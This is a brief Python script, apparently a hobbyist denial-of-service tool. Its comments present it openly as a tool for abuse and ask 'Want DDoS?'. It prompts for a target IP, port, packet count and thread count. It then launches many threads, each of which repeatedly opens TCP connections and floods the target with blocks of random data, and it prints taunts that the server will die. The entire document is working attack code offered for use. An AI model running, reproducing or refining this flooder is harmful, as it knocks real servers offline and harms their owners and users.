# This Tools Coding By IYooNih
# Tools Usage For Abuseing
# Tools For All People Abuse
# Don't Leak Ur You Got BlackList!!!

# Import Module
import random
import socket
import threading
# Info Tools [ IYooNih Tools ]
print("_______________________________")
print("[ + ] Welcome Back IYooNih")
print("[ ! ] This Tools Code By IYooNih")
print("[ ? ] Want DDoS?")
print("[ ! ] Enter Ip Now And Look")
print("------I-Y-O-O-N-I-H---ATTACK-------")

ip = str(input("[√] Enter Ip : "))
port = int(input("[√] Enter RDP Port (80/3389)   : "))
times = int(input("[√] Enter Packet (75000) : "))
threads = int(input("[√] Enter Thread (9024) : "))

def run():
    data = random._urandom(9024)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Sent!!!")
        except socket.error:
            s.close()
            print("[X] Attacking By IYooNih. 1 Sec Ur Server Die, Attack Ip====> ",ip," Attack Port : ",port,"!")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()